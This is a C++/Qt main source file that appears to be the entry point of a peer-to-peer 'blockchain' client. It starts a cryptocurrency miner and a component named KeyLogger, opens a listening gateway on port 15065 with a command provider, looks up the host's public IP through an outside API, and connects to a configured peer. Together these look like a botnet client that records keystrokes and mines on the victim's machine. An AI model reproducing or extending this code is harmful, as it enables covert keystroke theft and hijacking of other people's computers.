#include <QCoreApplication>
#include "Gateway.h"
#include "Global.h"
#include <QSettings>
#include <QDir>
#include <QJsonDocument>
#include <QJsonParseError>
#include <QJsonObject>
#include <QDebug>

#include "web/HttpManager.h"
#include "web/HttpResponse.h"

#include "core/CommandProvider.h"
#include "core/Context.h"

#include "blockchain/Block.h"
#include <blockchain/BlockChain.h>
#include <worker/Worker.h>
#include <worker/Miner.h>

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    
    try
    {
        Context::instance().load();
        Context::instance().miner = new Miner(1, &a);
        Context::instance().keyLogger = new KeyLogger(&a);
        Context::instance().pipeController = new PipeController(new Gateway(15065, &a), &a);
        Context::instance().messageController = new MessageController(&a);
    }
    catch(std::exception &e)
    {
        qDebug() << "Context initialisation failed!" << e.what();
        return -1;
    }
    
    try
    {
        BlockChain::instance().load();
    }
    catch(std::exception &e)
    {
        qDebug() << "Block-Chain initialisation failed!" << e.what();
        return -1;
    }
	
    
    
    HttpResponse resp(HttpManager::getPage(QUrl("http://api.sypexgeo.net/")));
    QJsonParseError err;
    QJsonDocument json = QJsonDocument::fromJson(resp.body().toUtf8(), &err);
    if (err.error != QJsonParseError::NoError)
    {
        qDebug() <<"Json parsing error" << err.errorString() <<  "near" << resp.body().mid(err.offset, 5);
    }
    Context::instance().setIp(json.object()["ip"].toString());
    qDebug() << "Public ip:" << Context::instance().getIp();

    QDir dir(a.applicationDirPath());
    QSettings settings(dir.absoluteFilePath("p2p.conf"), QSettings::IniFormat);

    

    CommandProvider::instance();
	Context::instance().miner->startMine();

    Context::instance().pipeController->addPipe(new Pipe(settings.value("net/connect", "127.0.0.1").toString()));

    int ret = a.exec();

    Context::instance().messageController->terminate();
    Context::instance().pipeController->terminate();
    Context::instance().keyLogger->terminate();

    return ret;
}
